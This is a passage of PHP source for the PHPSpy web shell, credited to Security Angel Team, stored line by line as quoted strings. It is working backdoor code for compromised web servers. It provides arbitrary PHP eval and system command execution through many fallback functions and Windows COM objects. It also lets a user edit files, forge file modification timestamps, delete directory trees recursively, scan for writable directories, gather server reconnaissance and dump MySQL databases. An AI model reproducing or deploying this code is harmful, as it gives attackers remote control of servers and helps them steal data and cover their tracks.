            "\tmakeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));",
            "\tmakeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));",
            "\tp('</p>');",
            "\tformfoot();",
            "}//end sql backup",
            "elseif ($action == 'eval') {",
            "\t$phpcode = trim($phpcode);",
            "\tif($phpcode){",
            "\t\tif (!preg_match('#<\\?#si', $phpcode)) {",
            "\t\t\t$phpcode = \"<?php\\n\\n{$phpcode}\\n\\n?>\";",
            "\t\teval(\"?\".\">$phpcode<?\");",
            "\tformhead(array('title'=>'Eval PHP Code'));",
            "\tmakehide('action','eval');",
            "\tmaketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));",
            "\tp('<p><a href=\"http://www.4ngel.net/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');",
            "\tformfooter();",
            "}//end eval",
            "elseif ($action == 'editfile') {",
            "\tif(file_exists($opfile)) {",
            "\t\t$fp=@fopen($opfile,'r');",
            "\t\t$contents=@fread($fp, filesize($opfile));",
            "\t\t@fclose($fp);",
            "\t\t$contents=htmlspecialchars($contents);",
            "\tformhead(array('title'=>'Create / Edit File'));",
            "\tmakehide('action','file');",
            "\tmakehide('dir',$nowpath);",
            "\tmakeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));",
            "\tmaketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));",
            "\tformfooter();",
            "}//end editfile",
            "elseif ($action == 'newtime') {",
            "\t$opfilemtime = @filemtime($opfile);",
            "\t//$time = strtotime(\"$year-$month-$day $hour:$minute:$second\");",
            "\t$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);",
            "\tformhead(array('title'=>'Clone file was last modified time'));",
            "\tmakehide('action','file');",
            "\tmakehide('dir',$nowpath);",
            "\tmakeinput(array('title'=>'Alter file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));",
            "\tmakeinput(array('title'=>'Reference file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));",
            "\tformfooter();",
            "\tformhead(array('title'=>'Set last modified'));",
            "\tmakehide('action','file');",
            "\tmakehide('dir',$nowpath);",
            "\tmakeinput(array('title'=>'Current file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));",
            "\tp('<p>Instead &raquo;');",
            "\tp('year:');",
            "\tmakeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));",
            "\tp('month:');",
            "\tmakeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));",
            "\tp('day:');",
            "\tmakeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));",
            "\tp('hour:');",
            "\tmakeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));",
            "\tp('minute:');",
            "\tmakeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));",
            "\tp('second:');",
            "\tmakeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));",
            "\tp('</p>');",
            "\tformfooter();",
            "}//end newtime",
            "elseif ($action == 'shell') {",
            "\tif (IS_WIN && IS_COM) {",
            "\t\tif($program && $parameter) {",
            "\t\t\t$shell= new COM('Shell.Application');",
            "\t\t\t$a = $shell->ShellExecute($program,$parameter);",
            "\t\t\tm('Program run has '.(!$a ? 'success' : 'fail'));",
            "\t\t!$program && $program = 'c:\\windows\\system32\\cmd.exe';",
            "\t\t!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';",
            "\t\tformhead(array('title'=>'Execute Program'));",
            "\t\tmakehide('action','shell');",
            "\t\tmakeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));",
            "\t\tp('<p>');",
            "\t\tmakeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));",
            "\t\tmakeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));",
            "\t\tp('</p>');",
            "\t\tformfoot();",
            "\tformhead(array('title'=>'Execute Command'));",
            "\tmakehide('action','shell');",
            "\tif (IS_WIN && IS_COM) {",
            "\t\t$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');",
            "\t\tmakeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));",
            "\tp('<p>');",
            "\tmakeinput(array('title'=>'Command','name'=>'command','value'=>$command));",
            "\tmakeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));",
            "\tp('</p>');",
            "\tformfoot();",
            "\tif ($command) {",
            "\t\tp('<hr width=\"100%\" noshade /><pre>');",
            "\t\tif ($execfunc=='wscript' && IS_WIN && IS_COM) {",
            "\t\t\t$wsh = new COM('WScript.shell');",
            "\t\t\t$exec = $wsh->exec('cmd.exe /c '.$command);",
            "\t\t\t$stdout = $exec->StdOut();",
            "\t\t\t$stroutput = $stdout->ReadAll();",
            "\t\t\techo $stroutput;",
            "\t\t} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {",
            "\t\t\t$descriptorspec = array(",
            "\t\t\t   0 => array('pipe', 'r'),",
            "\t\t\t   1 => array('pipe', 'w'),",
            "\t\t\t   2 => array('pipe', 'w')",
            "\t\t\t);",
            "\t\t\t$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);",
            "\t\t\tif (is_resource($process)) {",
            "\t\t\t\tfwrite($pipes[0], $command.\"\\r\\n\");",
            "\t\t\t\tfwrite($pipes[0], \"exit\\r\\n\");",
            "\t\t\t\tfclose($pipes[0]);",
            "\t\t\t\twhile (!feof($pipes[1])) {",
            "\t\t\t\t\techo fgets($pipes[1], 1024);",
            "\t\t\t\t}",
            "\t\t\t\tfclose($pipes[1]);",
            "\t\t\t\twhile (!feof($pipes[2])) {",
            "\t\t\t\t\techo fgets($pipes[2], 1024);",
            "\t\t\t\t}",
            "\t\t\t\tfclose($pipes[2]);",
            "\t\t\t\tproc_close($process);",
            "\t\t\t}",
            "\t\t} else {",
            "\t\t\techo(execute($command));",
            "\t\tp('</pre>');",
            "}//end shell",
            "elseif ($action == 'phpenv') {",
            "\t$upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';",
            "\t$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');",
            "\t!$dis_func && $dis_func = 'No';\t",
            "\t$info = array(",
            "\t\t1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),",
            "\t\t2 => array('Server Domain',$_SERVER['SERVER_NAME']),",
            "\t\t3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),",
            "\t\t4 => array('Server OS',PHP_OS),",
            "\t\t5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),",
            "\t\t6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),",
            "\t\t7 => array('Server Web Port',$_SERVER['SERVER_PORT']),",
            "\t\t8 => array('PHP run mode',strtoupper(php_sapi_name())),",
            "\t\t9 => array('The file path',__FILE__),",
            "\t\t10 => array('PHP Version',PHP_VERSION),",
            "\t\t11 => array('PHPINFO',(IS_PHPINFO ? '<a href=\"javascript:goaction(\\'phpinfo\\');\">Yes</a>' : 'No')),",
            "\t\t12 => array('Safe Mode',getcfg('safe_mode')),",
            "\t\t13 => array('Administrator',$adminmail),",
            "\t\t14 => array('allow_url_fopen',getcfg('allow_url_fopen')),",
            "\t\t15 => array('enable_dl',getcfg('enable_dl')),",
            "\t\t16 => array('display_errors',getcfg('display_errors')),",
            "\t\t17 => array('register_globals',getcfg('register_globals')),",
            "\t\t18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),",
            "\t\t19 => array('memory_limit',getcfg('memory_limit')),",
            "\t\t20 => array('post_max_size',getcfg('post_max_size')),",
            "\t\t21 => array('upload_max_filesize',$upsize),",
            "\t\t22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),",
            "\t\t23 => array('disable_functions',$dis_func),",
            "\tif($phpvarname) {",
            "\t\tm($phpvarname .' : '.getcfg($phpvarname));",
            "\tformhead(array('title'=>'Server environment'));",
            "\tmakehide('action','phpenv');",
            "\tmakeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));",
            "\tformfooter();",
            "\t$hp = array(0=> 'Server', 1=> 'PHP');",
            "\tfor($a=0;$a<2;$a++) {",
            "\t\tp('<h2>'.$hp[$a].' &raquo;</h2>');",
            "\t\tp('<ul class=\"info\">');",
            "\t\tif ($a==0) {",
            "\t\t\tfor($i=1;$i<=9;$i++) {",
            "\t\t\t\tp('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');",
            "\t\t\t}",
            "\t\t} elseif ($a == 1) {",
            "\t\t\tfor($i=10;$i<=23;$i++) {",
            "\t\t\t\tp('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');",
            "\t\t\t}",
            "\t\tp('</ul>');",
            "}//end phpenv",
            "else {",
            "\tm('Undefined Action');",
            "</td></tr></table>",
            "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">",
            "\t<span style=\"float:right;\"><?php debuginfo();ob_end_flush();?></span>",
            "\tCopyright (C) 2004-2008 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved.",
            "</div>",
            "</body>",
            "</html>",
            "<?php",
            "/*======================================================",
            "======================================================*/",
            "function m($msg) {",
            "\techo '<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;\">';",
            "\techo $msg;",
            "\techo '</div>';",
            "function scookie($key, $value, $life = 0, $prefix = 1) {",
            "\tglobal $admin, $timestamp, $_SERVER;",
            "\t$key = ($prefix ? $admin['cookiepre'] : '').$key;",
            "\t$life = $life ? $life : $admin['cookielife'];",
            "\t$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;",
            "\tsetcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);",
            "function multi($num, $perpage, $curpage, $tablename) {",
            "\t$multipage = '';",
            "\tif($num > $perpage) {",
            "\t\t$page = 10;",
            "\t\t$offset = 5;",
            "\t\t$pages = @ceil($num / $perpage);",
            "\t\tif($page > $pages) {",
            "\t\t\t$from = 1;",
            "\t\t\t$to = $pages;",
            "\t\t} else {",
            "\t\t\t$from = $curpage - $offset;",
            "\t\t\t$to = $curpage + $page - $offset - 1;",
            "\t\t\tif($from < 1) {",
            "\t\t\t\t$to = $curpage + 1 - $from;",
            "\t\t\t\t$from = 1;",
            "\t\t\t\tif(($to - $from) < $page && ($to - $from) < $pages) {",
            "\t\t\t\t\t$to = $page;",
            "\t\t\t\t}",
            "\t\t\t} elseif($to > $pages) {",
            "\t\t\t\t$from = $curpage - $pages + $to;",
            "\t\t\t\t$to = $pages;",
            "\t\t\t\tif(($to - $from) < $page && ($to - $from) < $pages) {",
            "\t\t\t\t\t$from = $pages - $page + 1;",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', 1);\">First</a> ' : '').($curpage > 1 ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\">Prev</a> ' : '');",
            "\t\tfor($i = $from; $i <= $to; $i++) {",
            "\t\t\t$multipage .= $i == $curpage ? $i.' ' : '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.$i.');\">['.$i.']</a> ';",
            "\t\t$multipage .= ($curpage < $pages ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage + 1).');\">Next</a>' : '').($to < $pages ? ' <a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.$pages.');\">Last</a>' : '');",
            "\t\t$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';",
            "\treturn $multipage;",
            "// ????",
            "function loginpage() {",
            "\t<style type=\"text/css\">",
            "\tinput {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}",
            "\t</style>",
            "\t<form method=\"POST\" action=\"\">",
            "\t<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">",
            "\t<input type=\"hidden\" name=\"doing\" value=\"login\">",
            "\t<doingYERmum />",
            "\t<input type=\"submit\" value=\"Login\">",
            "\t</form>",
            "<?php",
            "\texit;",
            "}//end loginpage()",
            "function execute($cfe) {",
            "\t$res = '';",
            "\tif ($cfe) {",
            "\t\tif(function_exists('exec')) {",
            "\t\t\t@exec($cfe,$res);",
            "\t\t\t$res = join(\"\\n\",$res);",
            "\t\t} elseif(function_exists('shell_exec')) {",
            "\t\t\t$res = @shell_exec($cfe);",
            "\t\t} elseif(function_exists('system')) {",
            "\t\t\t@ob_start();",
            "\t\t\t@system($cfe);",
            "\t\t\t$res = @ob_get_contents();",
            "\t\t\t@ob_end_clean();",
            "\t\t} elseif(function_exists('passthru')) {",
            "\t\t\t@ob_start();",
            "\t\t\t@passthru($cfe);",
            "\t\t\t$res = @ob_get_contents();",
            "\t\t\t@ob_end_clean();",
            "\t\t} elseif(@is_resource($f = @popen($cfe,\"r\"))) {",
            "\t\t\t$res = '';",
            "\t\t\twhile(!@feof($f)) {",
            "\t\t\t\t$res .= @fread($f,1024); ",
            "\t\t\t}",
            "\t\t\t@pclose($f);",
            "\treturn $res;",
            "function which($pr) {",
            "\t$path = execute(\"which $pr\");",
            "\treturn ($path ? $path : $pr); ",
            "function cf($fname,$text){",
            "\tif($fp=@fopen($fname,'w')) {",
            "\t\t@fputs($fp,@base64_decode($text));",
            "\t\t@fclose($fp);",
            "// ??????",
            "function debuginfo() {",
            "\tglobal $starttime;",
            "\t$mtime = explode(' ', microtime());",
            "\t$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);",
            "\techo 'Processed in '.$totaltime.' second(s)';",
            "//?????",
            "function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {",
            "\tif(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {",
            "\t\tp('<h2>Can not connect to MySQL server</h2>');",
            "\t\texit;",
            "\tif($link && $dbname) {",
            "\t\tif (!@mysql_select_db($dbname, $link)) {",
            "\t\t\tp('<h2>Database selected has error</h2>');",
            "\t\t\texit;",
            "\tif($link && mysql_get_server_info() > '4.1') {",
            "\t\tif(in_array(strtolower($charset), array('gbk', 'big5', 'utf8'))) {",
            "\t\t\tq(\"SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;\", $link);",
            "\treturn $link;",
            "// ??????",
            "function s_array(&$array) {",
            "\tif (is_array($array)) {",
            "\t\tforeach ($array as $k => $v) {",
            "\t\t\t$array[$k] = s_array($v);",
            "\t} else if (is_string($array)) {",
            "\t\t$array = stripslashes($array);",
            "\treturn $array;",
            "// ??HTML??",
            "function html_clean($content) {",
            "\t$content = htmlspecialchars($content);",
            "\t$content = str_replace(\"\\n\", \"<br />\", $content);",
            "\t$content = str_replace(\"  \", \"&nbsp;&nbsp;\", $content);",
            "\t$content = str_replace(\"\\t\", \"&nbsp;&nbsp;&nbsp;&nbsp;\", $content);",
            "\treturn $content;",
            "// ????",
            "function getChmod($filepath){",
            "\treturn substr(base_convert(@fileperms($filepath),10,8),-4);",
            "function getPerms($filepath) {",
            "\t$mode = @fileperms($filepath);",
            "\tif (($mode & 0xC000) === 0xC000) {$type = 's';}",
            "\telseif (($mode & 0x4000) === 0x4000) {$type = 'd';}",
            "\telseif (($mode & 0xA000) === 0xA000) {$type = 'l';}",
            "\telseif (($mode & 0x8000) === 0x8000) {$type = '-';} ",
            "\telseif (($mode & 0x6000) === 0x6000) {$type = 'b';}",
            "\telseif (($mode & 0x2000) === 0x2000) {$type = 'c';}",
            "\telseif (($mode & 0x1000) === 0x1000) {$type = 'p';}",
            "\telse {$type = '?';}",
            "\t$owner['read'] = ($mode & 00400) ? 'r' : '-'; ",
            "\t$owner['write'] = ($mode & 00200) ? 'w' : '-'; ",
            "\t$owner['execute'] = ($mode & 00100) ? 'x' : '-'; ",
            "\t$group['read'] = ($mode & 00040) ? 'r' : '-'; ",
            "\t$group['write'] = ($mode & 00020) ? 'w' : '-'; ",
            "\t$group['execute'] = ($mode & 00010) ? 'x' : '-'; ",
            "\t$world['read'] = ($mode & 00004) ? 'r' : '-'; ",
            "\t$world['write'] = ($mode & 00002) ? 'w' : '-'; ",
            "\t$world['execute'] = ($mode & 00001) ? 'x' : '-'; ",
            "\tif( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}",
            "\tif( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}",
            "\tif( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}",
            "\treturn $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];",
            "function getUser($filepath)\t{",
            "\tif (function_exists('posix_getpwuid')) {",
            "\t\t$array = @posix_getpwuid(@fileowner($filepath));",
            "\t\tif ($array && is_array($array)) {",
            "\t\t\treturn ' / <a href=\"#\" title=\"User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'\">'.$array['name'].'</a>';",
            "\treturn '';",
            "// ????",
            "function deltree($deldir) {",
            "\t$mydir=@dir($deldir);\t",
            "\twhile($file=$mydir->read())\t{ \t\t",
            "\t\tif((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) { ",
            "\t\t\t@chmod($deldir.'/'.$file,0777);",
            "\t\t\tdeltree($deldir.'/'.$file); ",
            "\t\tif (is_file($deldir.'/'.$file)) {",
            "\t\t\t@chmod($deldir.'/'.$file,0777);",
            "\t\t\t@unlink($deldir.'/'.$file);",
            "\t$mydir->close(); ",
            "\t@chmod($deldir,0777);",
            "\treturn @rmdir($deldir) ? 1 : 0;",
            "// ??????????",
            "function bg() {",
            "\tglobal $bgc;",
            "\treturn ($bgc++%2==0) ? 'alt1' : 'alt2';",
            "// ???????????",
            "function getPath($scriptpath, $nowpath) {",
            "\tif ($nowpath == '.') {",
            "\t\t$nowpath = $scriptpath;",
            "\t$nowpath = str_replace('\\\\', '/', $nowpath);",
            "\t$nowpath = str_replace('//', '/', $nowpath);",
            "\tif (substr($nowpath, -1) != '/') {",
            "\t\t$nowpath = $nowpath.'/';",
            "\treturn $nowpath;",
            "// ???????????",
            "function getUpPath($nowpath) {",
            "\t$pathdb = explode('/', $nowpath);",
            "\t$num = count($pathdb);",
            "\tif ($num > 2) {",
            "\t\tunset($pathdb[$num-1],$pathdb[$num-2]);",
            "\t$uppath = implode('/', $pathdb).'/';",
            "\t$uppath = str_replace('//', '/', $uppath);",
            "\treturn $uppath;",
            "// ??PHP????",
            "function getcfg($varname) {",
            "\t$result = get_cfg_var($varname);",
            "\tif ($result == 0) {",
            "\t\treturn 'No';",
            "\t} elseif ($result == 1) {",
            "\t\treturn 'Yes';",
            "\t} else {",
            "\t\treturn $result;",
            "// ??????",
            "function getfun($funName) {",
            "\treturn (false !== function_exists($funName)) ? 'Yes' : 'No';",
            "function GetList($dir){",
            "\tglobal $dirdata,$j,$nowpath;",
            "\t!$j && $j=1;",
            "\tif ($dh = opendir($dir)) {",
            "\t\twhile ($file = readdir($dh)) {",
            "\t\t\t$f=str_replace('//','/',$dir.'/'.$file);",
            "\t\t\tif($file!='.' && $file!='..' && is_dir($f)){",
            "\t\t\t\tif (is_writable($f)) {",
            "\t\t\t\t\t$dirdata[$j]['filename']=str_replace($nowpath,'',$f);",
            "\t\t\t\t\t$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));",
            "\t\t\t\t\t$dirdata[$j]['dirchmod']=getChmod($f);",
            "\t\t\t\t\t$dirdata[$j]['dirperm']=getPerms($f);",
            "\t\t\t\t\t$dirdata[$j]['dirlink']=ue($dir);",
            "\t\t\t\t\t$dirdata[$j]['server_link']=$f;",
            "\t\t\t\t\t$dirdata[$j]['client_link']=ue($f);",
            "\t\t\t\t\t$j++;",
            "\t\t\t\t}",
            "\t\t\t\tGetList($f);",
            "\t\t\t}",
            "\t\tclosedir($dh);",
            "\t\tclearstatcache();",
            "\t\treturn $dirdata;",
            "\t} else {",
            "\t\treturn array();",
            "function qy($sql) { ",
            "\t//echo $sql.'<br>';",
            "\t$res = $error = '';",
            "\tif(!$res = @mysql_query($sql)) { ",
            "\t\treturn 0;",
            "\t} else if(is_resource($res)) {",
            "\t\treturn 1; ",
            "\t} else {",
            "\t\treturn 2;",
            "\treturn 0;",
            "function q($sql) { ",
            "\treturn @mysql_query($sql);",
            "function fr($qy){",
            "\tmysql_free_result($qy);",
            "function sizecount($size) {",
            "\tif($size > 1073741824) {",
            "\t\t$size = round($size / 1073741824 * 100) / 100 . ' G';",
            "\t} elseif($size > 1048576) {",
            "\t\t$size = round($size / 1048576 * 100) / 100 . ' M';",
            "\t} elseif($size > 1024) {",
            "\t\t$size = round($size / 1024 * 100) / 100 . ' K';",
            "\t} else {",
            "\t\t$size = $size . ' B';",
            "\treturn $size;",
            "// ?????",
            "class PHPZip{",
            "\tvar $out='';",
            "\tfunction PHPZip($dir)\t{",
            "\t\tif (@function_exists('gzcompress'))\t{",
            "\t\t\t$curdir = getcwd();",
            "\t\t\tif (is_array($dir)) $filelist = $dir;",
            "\t\t\telse{",
            "\t\t\t\t$filelist=$this -> GetFileList($dir);//????",
            "\t\t\t\tforeach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);",
            "\t\t\t}",
            "\t\t\tif ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);",
            "\t\t\telse chdir($curdir);",
            "\t\t\tif (count($filelist)>0){",
            "\t\t\t\tforeach($filelist as $filename){",
            "\t\t\t\t\tif (is_file($filename)){",
            "\t\t\t\t\t\t$fd = fopen ($filename, 'r');",
            "\t\t\t\t\t\t$content = @fread ($fd, filesize($filename));",
            "\t\t\t\t\t\tfclose ($fd);",
            "\t\t\t\t\t\tif (is_array($dir)) $filename = basename($filename);",
            "\t\t\t\t\t\t$this -> addFile($content, $filename);",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\t$this->out = $this -> file();",
            "\t\t\t\tchdir($curdir);",
            "\t\t\t}",
            "\t\t\treturn 1;",
            "\t\telse return 0;",
            "\t// ??????????",
            "\tfunction GetFileList($dir){",
            "\t\tstatic $a;",
            "\t\tif (is_dir($dir)) {",
            "\t\t\tif ($dh = opendir($dir)) {",
            "\t\t\t\twhile ($file = readdir($dh)) {",
            "\t\t\t\t\tif($file!='.' && $file!='..'){",
            "\t\t\t\t\t\t$f=$dir .'/'. $file;",
            "\t\t\t\t\t\tif(is_dir($f)) $this->GetFileList($f);",
            "\t\t\t\t\t\t$a[]=$f;",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\tclosedir($dh);",
            "\t\t\t}",
            "\t\treturn $a;",
            "\tvar $datasec      = array();",
            "\tvar $ctrl_dir     = array();",
            "\tvar $eof_ctrl_dir = \"\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\";",
            "\tvar $old_offset   = 0;",
            "\tfunction unix2DosTime($unixtime = 0) {",
            "\t\t$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);",
            "\t\tif ($timearray['year'] < 1980) {",
            "\t\t\t$timearray['year']    = 1980;",
            "\t\t\t$timearray['mon']     = 1;",
            "\t\t\t$timearray['mday']    = 1;",
            "\t\t\t$timearray['hours']   = 0;",
            "\t\t\t$timearray['minutes'] = 0;",
            "\t\t\t$timearray['seconds'] = 0;",
            "\t\t} // end if",
            "\t\treturn (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |",
            "\t\t\t\t($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);",
            "\tfunction addFile($data, $name, $time = 0) {",
            "\t\t$name = str_replace('\\\\', '/', $name);",
            "\t\t$dtime = dechex($this->unix2DosTime($time));",
            "\t\t$hexdtime\t= '\\x' . $dtime[6] . $dtime[7]",
            "\t\t\t\t\t. '\\x' . $dtime[4] . $dtime[5]",
            "\t\t\t\t\t. '\\x' . $dtime[2] . $dtime[3]",
            "\t\t\t\t\t. '\\x' . $dtime[0] . $dtime[1];",
            "\t\teval('$hexdtime = \"' . $hexdtime . '\";');",
            "\t\t$fr\t= \"\\x50\\x4b\\x03\\x04\";",
            "\t\t$fr\t.= \"\\x14\\x00\";",
            "\t\t$fr\t.= \"\\x00\\x00\";",
            "\t\t$fr\t.= \"\\x08\\x00\";",
            "\t\t$fr\t.= $hexdtime;",
            "\t\t$unc_len = strlen($data);",
            "\t\t$crc = crc32($data);",
            "\t\t$zdata = gzcompress($data);",
            "\t\t$c_len = strlen($zdata);",
            "\t\t$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);",
            "\t\t$fr .= pack('V', $crc);",
            "\t\t$fr .= pack('V', $c_len);",
            "\t\t$fr .= pack('V', $unc_len);",
            "\t\t$fr .= pack('v', strlen($name));",
            "\t\t$fr .= pack('v', 0);",
            "\t\t$fr .= $name;",
            "\t\t$fr .= $zdata;",
            "\t\t$fr .= pack('V', $crc);",
            "\t\t$fr .= pack('V', $c_len);",
            "\t\t$fr .= pack('V', $unc_len);",
            "\t\t$this -> datasec[] = $fr;",
            "\t\t$new_offset = strlen(implode('', $this->datasec));",
            "\t\t$cdrec = \"\\x50\\x4b\\x01\\x02\";",
            "\t\t$cdrec .= \"\\x00\\x00\";",
            "\t\t$cdrec .= \"\\x14\\x00\";",
            "\t\t$cdrec .= \"\\x00\\x00\";",
            "\t\t$cdrec .= \"\\x08\\x00\";",
            "\t\t$cdrec .= $hexdtime;",
            "\t\t$cdrec .= pack('V', $crc);",
            "\t\t$cdrec .= pack('V', $c_len);",
            "\t\t$cdrec .= pack('V', $unc_len);",
            "\t\t$cdrec .= pack('v', strlen($name) );",
            "\t\t$cdrec .= pack('v', 0 );",
            "\t\t$cdrec .= pack('v', 0 );",
            "\t\t$cdrec .= pack('v', 0 );",
            "\t\t$cdrec .= pack('v', 0 );",
            "\t\t$cdrec .= pack('V', 32 );",
            "\t\t$cdrec .= pack('V', $this -> old_offset );",
            "\t\t$this -> old_offset = $new_offset;",
            "\t\t$cdrec .= $name;",
            "\t\t$this -> ctrl_dir[] = $cdrec;",
            "\tfunction file() {",
            "\t\t$data    = implode('', $this -> datasec);",
            "\t\t$ctrldir = implode('', $this -> ctrl_dir);",
            "\t\treturn $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) .\tpack('V', strlen($ctrldir)) . pack('V', strlen($data)) . \"\\x00\\x00\";",
            "// ?????",
            "function sqldumptable($table, $fp=0) {",
            "\t$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";",
            "\t$tabledump .= \"CREATE TABLE $table (\\n\";",
            "\t$firstfield=1;",
            "\t$fields = q(\"SHOW FIELDS FROM $table\");",
            "\twhile ($field = mysql_fetch_array($fields)) {",
            "\t\tif (!$firstfield) {",
            "\t\t\t$tabledump .= \",\\n\";",
            "\t\t} else {",
            "\t\t\t$firstfield=0;",
            "\t\t$tabledump .= \"   $field[Field] $field[Type]\";",
            "\t\tif (!empty($field[\"Default\"])) {",
            "\t\t\t$tabledump .= \" DEFAULT '$field[Default]'\";",
            "\t\tif ($field['Null'] != \"YES\") {",
            "\t\t\t$tabledump .= \" NOT NULL\";",
            "\t\tif ($field['Extra'] != \"\") {",
            "\t\t\t$tabledump .= \" $field[Extra]\";",
            "\tfr($fields);",
            "\t$keys = q(\"SHOW KEYS FROM $table\");",
            "\twhile ($key = mysql_fetch_array($keys)) {",
            "\t\t$kname=$key['Key_name'];",
            "\t\tif ($kname != \"PRIMARY\" && $key['Non_unique'] == 0) {",
            "\t\t\t$kname=\"UNIQUE|$kname\";",
            "\t\tif(!is_array($index[$kname])) {",
            "\t\t\t$index[$kname] = array();",
            "\t\t$index[$kname][] = $key['Column_name'];",
            "\tfr($keys);",
            "\twhile(list($kname, $columns) = @each($index)) {",
            "\t\t$tabledump .= \",\\n\";",
            "\t\t$colnames=implode($columns,\",\");",
            "\t\tif ($kname == \"PRIMARY\") {",
            "\t\t\t$tabledump .= \"   PRIMARY KEY ($colnames)\";",
            "\t\t} else {",
            "\t\t\tif (substr($kname,0,6) == \"UNIQUE\") {",
            "\t\t\t\t$kname=substr($kname,7);",
            "\t\t\t}",
            "\t\t\t$tabledump .= \"   KEY $kname ($colnames)\";",
            "\t$tabledump .= \"\\n);\\n\\n\";",
            "\tif ($fp) {",
            "\t\tfwrite($fp,$tabledump);",
            "\t} else {",
            "\t\techo $tabledump;",
            "\t$rows = q(\"SELECT * FROM $table\");",
            "\t$numfields = mysql_num_fields($rows);",
            "\twhile ($row = mysql_fetch_array($rows)) {",
            "\t\t$tabledump = \"INSERT INTO $table VALUES(\";",
            "\t\t$fieldcounter=-1;",
            "\t\t$firstfield=1;",
            "\t\twhile (++$fieldcounter<$numfields) {",
            "\t\t\tif (!$firstfield) {",
